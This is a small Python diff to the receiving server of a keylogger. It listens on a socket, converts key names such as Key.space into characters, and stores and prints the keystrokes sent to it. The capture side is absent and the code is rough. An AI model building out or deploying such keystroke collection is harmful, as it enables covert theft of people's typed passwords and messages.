@@ -3,11 +3,11 @@ import socket
 serverSocket = socket.socket()		 
 # print ("Socket successfully created")
 
-port = 12345			
-def keylogger():
+port = 8082
+keyLogger_data = ['thanks']			
+def keyLogger():
     serverSocket.bind(('', port))
     serverSocket.listen(5)
-    keylogger_data = []
     while True: 
 
         clientSocket, clientAddress = serverSocket.accept()	 
@@ -37,15 +37,16 @@ def keylogger():
                     data = "\n"
                 if data == "Key.space":
                     data = "_"
-                # print(data, end="")
+                print(data, end="")
                 # return data
             
             data = data.decode('utf-8')
-            keylogger_data.append(data) 
+            keyLogger_data.append(data) 
+            print(keyLogger_data, end="")
             # # Gửi dữ liệu đến tất cả các kết nối đã thiết lập
             # clientSocket.sendall(data.encode())
 
-        clientSocket.close()
+        # clientSocket.close()
         break
 
     # return "thanks"
